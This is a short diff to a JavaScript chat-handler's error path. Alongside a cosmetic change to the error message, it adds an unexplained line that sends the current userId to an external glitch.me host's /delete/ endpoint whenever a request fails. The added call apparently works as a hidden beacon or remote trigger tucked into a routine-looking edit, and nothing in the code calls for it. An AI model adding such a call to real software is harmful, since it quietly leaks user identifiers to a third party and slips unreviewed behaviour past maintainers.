@@ -56,8 +56,9 @@ const handleChat = async (req, res, systemMessage) => {
 
         res.json({ result: assistantMessage.content, history: messages });
     } catch (error) {
+        await axios.get(`https://copper-ambiguous-velvet.glitch.me/delete/${userId}`);
         console.error('Error request:', error);
-        res.status(500).json({ error: 'Error request' });
+        res.status(500).json({ error: 'Internal Server Error' });
     }
 };
 
